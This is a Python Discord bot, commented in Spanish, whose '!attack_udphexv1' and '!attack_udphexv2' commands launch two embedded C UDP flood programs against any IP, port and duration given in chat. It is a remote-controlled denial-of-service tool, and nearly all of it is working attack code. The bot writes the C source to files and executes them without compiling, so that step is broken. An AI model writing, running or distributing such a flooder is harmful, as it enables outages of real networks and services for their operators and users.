import discord
from discord.ext import commands
import subprocess
import os

# Definir los nombres de los scripts
UDP_HEX_V1_SCRIPT = "udphexv1"
UDP_HEX_V2_SCRIPT = "udphexv2"

# Crear el bot con intents
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Evento al iniciar el bot
@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')

# Comando para guardar el token
@bot.command()
async def settoken(ctx, token):
    """Guardar el token"""
    with open("token.txt", "w") as f:
        f.write(token)
    await ctx.send("Token guardado en token.txt")

# Función para leer el token desde el archivo
def get_token():
    try:
        with open("token.txt", "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None

# Comando para ejecutar udphexv1
@bot.command()
async def attack_udphexv1(ctx, ip, port, time):
    """UDPHexV1 Que consume una gran cantidad de recursos"""
    try:
        # Construir el comando para ejecutar el script
        command = [UDP_HEX_V1_SCRIPT, ip, port, "-t", "32", "-s", "64", "-d", time]

        # Ejecutar el script y capturar la salida
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        # Enviar la salida al canal de Discord
        output = stdout.decode()
        error = stderr.decode()

        if output:
            await ctx.send(f"**Salida de udphexv1:**\n```\n{output}\n```")
        if error:
            await ctx.send(f"**Errores de udphexv1:**\n```\n{error}\n```")

    except FileNotFoundError:
        await ctx.send(f"Error: No esta el script {UDP_HEX_V1_SCRIPT}")
    except Exception as e:
        await ctx.send(f"Error al ejecutar udphexv1: {e}")

# Comando para ejecutar udphexv2
@bot.command()
async def attack_udphexv2(ctx, ip, port, time):
    """UDPHexV2 Optimizado con mayor potencia pero menos consumidor de la cpu"""
    try:
        # Construir el comando para ejecutar el script
        command = [UDP_HEX_V2_SCRIPT, ip, port, time]

        # Ejecutar el script y capturar la salida
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        # Enviar la salida al canal de Discord
        output = stdout.decode()
        error = stderr.decode()

        if output:
            await ctx.send(f"**Salida de udphexv2:**\n```\n{output}\n```")
        if error:
            await ctx.send(f"**Errores de udphexv2:**\n```\n{error}\n```")

    except FileNotFoundError:
        await ctx.send(f"Error: El script no esta {UDP_HEX_V2_SCRIPT}")
    except Exception as e:
        await ctx.send(f"Error al ejecutar udphexv2: {e}")

# Ejecutar el bot
if __name__ == "__main__":
    # Guardar los scripts en archivos (udphexv1 y udphexv2)
    with open(UDP_HEX_V1_SCRIPT, "w") as f:
        f.write("""#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

#define MAX_PACKET_SIZE 65507
#define DEFAULT_THREADS 4
#define DEFAULT_DURATION 30

typedef struct {
    char *target_ip;
    int target_port;
    int packet_size;
    int delay_ms;
    int duration;
    int thread_id;
    volatile int *running;
    unsigned long *packets_sent;
} thread_data_t;

// Estadísticas globales
volatile int running = 1;
unsigned long total_packets = 0;
time_t start_time;

// Función para generar datos aleatorios
void generate_random_data(char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() % 256;
    }
}

// Función para generar datos hexadecimales específicos
void generate_hex_data(char *buffer, int size, const char *hex_pattern) {
    int pattern_len = strlen(hex_pattern);
    for (int i = 0; i < size; i++) {
        buffer[i] = hex_pattern[i % pattern_len];
    }
}

// Función para crear paquete con patrón personalizado
void create_custom_packet(char *buffer, int size, int thread_id, unsigned long packet_num) {
    // Cabecera con información del thread y número de paquete
    memcpy(buffer, &thread_id, sizeof(int));
    memcpy(buffer + sizeof(int), &packet_num, sizeof(unsigned long));
    
    // Datos aleatorios para el resto del paquete
    generate_random_data(buffer + sizeof(int) + sizeof(unsigned long), 
                        size - sizeof(int) - sizeof(unsigned long));
}

// Handler para señales (Ctrl+C)
void signal_handler(int sig) {
    running = 0;
    printf("\\nDeteniendo test...\\n");
}

// Función de worker thread
void *udp_flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    char packet_buffer[MAX_PACKET_SIZE];
    unsigned long local_packets = 0;
    struct timespec delay_time = {0, data->delay_ms * 1000000L};
    
    // Crear socket UDP
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Error creando socket");
        return NULL;
    }
    
    // Configurar socket para no bloquear (opcional para máximo rendimiento)
    int optval = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    // Configurar dirección destino
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &target_addr.sin_addr);
    
    printf("Thread %d iniciado - Objetivo: %s:%d\\n", 
           data->thread_id, data->target_ip, data->target_port);
    
    time_t thread_start = time(NULL);
    
    while (*data->running && (time(NULL) - thread_start) < data->duration) {
        // Crear paquete personalizado
        create_custom_packet(packet_buffer, data->packet_size, 
                           data->thread_id, local_packets);
        
        // Enviar paquete
        ssize_t sent = sendto(sockfd, packet_buffer, data->packet_size, 0,
                            (struct sockaddr*)&target_addr, sizeof(target_addr));
        
        if (sent > 0) {
            local_packets++;
            __sync_fetch_and_add(data->packets_sent, 1);
        }
        
        // Pequeña pausa si se especificó delay
        if (data->delay_ms > 0) {
            nanosleep(&delay_time, NULL);
        }
    }
    
    close(sockfd);
    printf("Thread %d finalizado - Paquetes enviados: %lu\\n", 
           data->thread_id, local_packets);
    
    return NULL;
}

// Función para mostrar estadísticas en tiempo real
void *stats_thread(void *arg) {
    time_t last_time = start_time;
    unsigned long last_packets = 0;
    
    while (running) {
        sleep(1);
        
        time_t current_time = time(NULL);
        unsigned long current_packets = total_packets;
        
        double elapsed = difftime(current_time, last_time);
        unsigned long packets_diff = current_packets - last_packets;
        double pps = (elapsed > 0) ? packets_diff / elapsed : 0;
        
        printf("\\rEstadísticas: Total=%lu Paquetes, PPS=%.2f, Tiempo=%lds", 
               current_packets, pps, (current_time - start_time));
        fflush(stdout);
        
        last_time = current_time;
        last_packets = current_packets;
    }
    
    printf("\\n");
    return NULL;
}

void print_usage(const char *program_name) {
    printf("UDP Flood Tester Optimizado\\n");
    printf("Uso: %s <IP> <PUERTO> [OPCIONES]\\n\\n", program_name);
    printf("Opciones:\\n");
    printf("  -t NUM      Número de threads (default: %d)\\n", DEFAULT_THREADS);
    printf("  -s SIZE     Tamaño del paquete en bytes (default: 1024)\\n");
    printf("  -d SECS     Duración en segundos (default: %d)\\n", DEFAULT_DURATION);
    printf("  -D MS       Delay entre paquetes en ms (default: 0 - máximo rendimiento)\\n");
    printf("  -h          Mostrar esta ayuda\\n\\n");
    printf("Ejemplos:\\n");
    printf("  %s 192.168.1.1 80 -t 8 -s 512 -d 60\\n", program_name);
    printf("  %s 10.0.0.1 443 -t 16 -s 2048 -D 1\\n", program_name);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage(argv[0]);
        return 1;
    }
    
    // Configuración por defecto
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = DEFAULT_THREADS;
    int packet_size = 1024;
    int duration = DEFAULT_DURATION;
    int delay_ms = 0;
    
    // Parsear argumentos
    int opt;
    while ((opt = getopt(argc, argv, "t:s:d:D:h")) != -1) {
        switch (opt) {
            case 't':
                num_threads = atoi(optarg);
                break;
            case 's':
                packet_size = atoi(optarg);
                break;
            case 'd':
                duration = atoi(optarg);
                break;
            case 'D':
                delay_ms = atoi(optarg);
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    // Validaciones
    if (packet_size > MAX_PACKET_SIZE) {
        printf("Error: Tamaño de paquete máximo es %d\\n", MAX_PACKET_SIZE);
        return 1;
    }
    
    if (packet_size < (int)(sizeof(int) + sizeof(unsigned long))) {
        printf("Error: Tamaño de paquete mínimo es %lu\\n", 
               sizeof(int) + sizeof(unsigned long));
        return 1;
    }
    
    printf("=== UDP Flood Tester Optimizado ===\\n");
    printf("Objetivo: %s:%d\\n", target_ip, target_port);
    printf("Threads: %d\\n", num_threads);
    printf("Tamaño paquete: %d bytes\\n", packet_size);
    printf("Duración: %d segundos\\n", duration);
    printf("Delay: %d ms\\n", delay_ms);
    printf("Iniciando ataque en 3 segundos...\\n");
    sleep(3);
    
    // Configurar handler para Ctrl+C
    signal(SIGINT, signal_handler);
    
    // Inicializar estadísticas
    start_time = time(NULL);
    
    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    pthread_t stats_tid;
    thread_data_t *thread_data = malloc(num_threads * sizeof(thread_data_t));
    
    if (!threads || !thread_data) {
        perror("Error asignando memoria");
        return 1;
    }
    
    // Crear thread de estadísticas
    pthread_create(&stats_tid, NULL, stats_thread, NULL);
    
    // Crear threads workers
    for (int i = 0; i < num_threads; i++) {
        thread_data[i].target_ip = target_ip;
        thread_data[i].target_port = target_port;
        thread_data[i].packet_size = packet_size;
        thread_data[i].delay_ms = delay_ms;
        thread_data[i].duration = duration;
        thread_data[i].thread_id = i;
        thread_data[i].running = &running;
        thread_data[i].packets_sent = &total_packets;
        
        if (pthread_create(&threads[i], NULL, udp_flood_thread, &thread_data[i]) != 0) {
            perror("Error creando thread");
            running = 0;
            break;
        }
    }
    
    // Esperar a que terminen los threads workers
    for (int i = 0; i < num_threads; i++) {
        if (threads[i]) {
            pthread_join(threads[i], NULL);
        }
    }
    
    // Esperar thread de estadísticas
    running = 0;
    pthread_join(stats_tid, NULL);
    
    // Estadísticas finales
    time_t end_time = time(NULL);
    double total_time = difftime(end_time, start_time);
    double avg_pps = (total_time > 0) ? total_packets / total_time : 0;
    
    printf("\\n=== Estadísticas Finales ===\\n");
    printf("Paquetes totales enviados: %lu\\n", total_packets);
    printf("Tiempo total: %.2f segundos\\n", total_time);
    printf("Promedio PPS: %.2f paquetes/segundo\\n", avg_pps);
    printf("Ancho de banda aproximado: %.2f MB/s\\n", 
           (total_packets * packet_size) / (total_time * 1024 * 1024));
    
    // Limpiar memoria
    free(threads);
    free(thread_data);
    
    return 0;
}""")
    with open(UDP_HEX_V2_SCRIPT, "w") as f:
        f.write("""#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <time.h>
#include <pthread.h>

#define SIZE 1400

struct argsattack{
    char *ip;
    unsigned short port;
    time_t start;
    int duracion;
};

int countcpu(void){
    int cpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if(cpu <= 0){
        fprintf(stderr, "\\n[ UDP HEX ] Error de conteo de cpus");
        exit(1);
    }
    return cpu * 2; // Probar la *2
}

void *udp(void *arg){
    struct argsattack *args = (struct argsattack *)arg;
    unsigned char payload[SIZE];
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0){
        perror("sock");
        return NULL;
    }
    
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(args->port);
    dst.sin_addr.s_addr = inet_addr(args->ip);
    
    connect(sock, (struct sockaddr*)&dst, sizeof(dst));
    
    unsigned int seed = time(NULL) ^ pthread_self();
    
    while(time(NULL) - args->start < args->duracion){
        for(int i = 0; i < SIZE; i++){
            payload[i] = rand_r(&seed) & 0xFF;
        }
        
        send(sock, payload, SIZE, 0);
}
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]){
    if(argc != 4){
        fprintf(stderr, "uso: ./%s <ip> <port> <time>", argv[0]);
        return 1;
    }
    struct argsattack args;
    args.ip = argv[1];
    args.port = atoi(argv[2]);
    args.duracion = atoi(argv[3]);
    time_t inicio = time(NULL);
    args.start = inicio;
    
    int tam = countcpu();
    
    pthread_t *thr = calloc(tam, sizeof(pthread_t));
    if(!thr){
        fprintf(stderr, "\\n[ UDP HEX ] Error de asignacion de memoria.\\n");
        exit(1);
    }
    
    for(int i = 0; i < tam; i++){
        if(pthread_create(&thr[i], NULL, udp, &args) != 0){
            fprintf(stderr, "\\n[ UDP HEX ] Error de inicializacion de hilos\\n");
            free(thr);
            exit(1);
        }
    }
    
    printf("[ UDP HEX ] Send ip: %s port: %hd time: %d", args.ip, args.port, args.duracion);
    fflush(stdout);
    
    for(int i = 0; i < tam; i++){
        pthread_join(thr[i], NULL);
    }
    
    free(thr);
    return 0;
}""")

    # Dar permisos de ejecución a los scripts (en sistemas Unix)
    try:
        os.chmod(UDP_HEX_V1_SCRIPT, 0o755)
        os.chmod(UDP_HEX_V2_SCRIPT, 0o755)
    except OSError as e:
        print(f"Error al cambiar permisos: {e}")
        print("Asegúrate de ejecutar esto en un entorno compatible con chmod (Linux/macOS) o ajusta los permisos manualmente.")

    # Leer el token desde el archivo
    token = get_token()

    if token:
        bot.run(token)
    else:
        print("No se encontró el token, guarda el token en token.txt usando el comando !settoken")
